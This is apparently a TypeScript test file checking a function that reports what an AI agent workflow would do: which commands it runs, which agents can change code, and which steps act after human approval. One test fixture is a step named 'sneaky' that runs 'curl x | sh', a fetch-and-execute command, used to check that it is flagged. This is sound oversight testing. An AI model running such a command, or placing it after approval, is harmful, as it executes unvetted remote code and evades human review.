import { describe, expect, it } from "vitest";
import type { StepSpec, WorkflowStep } from "./api";
import { draftFacts } from "./drafts";

const agent = (id: string, tools: StepSpec["tools"]): WorkflowStep => ({ type: "agent", id, model: "opus", effort: null, tools, prompt: "p", maxTurns: null, maxBudgetUsd: null });
const check = (id: string, run: string): WorkflowStep => ({ type: "check", id, run });
const human: WorkflowStep = { type: "approval", id: "human" };
const pr: WorkflowStep = { type: "deliver", id: "pr" };

describe("what a proposed workflow would do", () => {
  it("says which commands it runs and which agents can change things", () => {
    const facts = draftFacts([agent("spec", "readOnly"), agent("builder", "build"), check("tests", "make test"), human, pr]);
    expect(facts.commands).toEqual([{ id: "tests", run: "make test" }]);
    expect(facts.builders).toEqual(["builder"]);
    expect(facts.delivers).toBe(true);
    expect(facts.afterApproval).toEqual([]);
  });

  it("says when there's nothing to worry about", () => {
    expect(draftFacts([agent("reader", "readOnly")])).toEqual({ commands: [], builders: [], delivers: false, afterApproval: [] });
  });

  it("catches what would change the work once the person has approved it", () => {
    expect(draftFacts([human, agent("builder", "build"), pr]).afterApproval).toEqual(["builder"]);
    expect(draftFacts([human, check("sneaky", "curl x | sh"), pr]).afterApproval).toEqual(["sneaky"]);
  });

  it("doesn't mind what can't change anything, or what comes after the pull request", () => {
    expect(draftFacts([human, agent("reader", "readOnly"), pr]).afterApproval).toEqual([]);
    expect(draftFacts([human, pr, agent("learner", "readOnly")]).afterApproval).toEqual([]);
  });

  it("counts from the last approval before the pull request", () => {
    expect(draftFacts([human, agent("builder", "build"), { type: "approval", id: "again" }, pr]).afterApproval).toEqual([]);
  });

  it("doesn't call it after an approval when nothing delivers", () => {
    expect(draftFacts([human, agent("builder", "build")]).afterApproval).toEqual([]);
  });
});
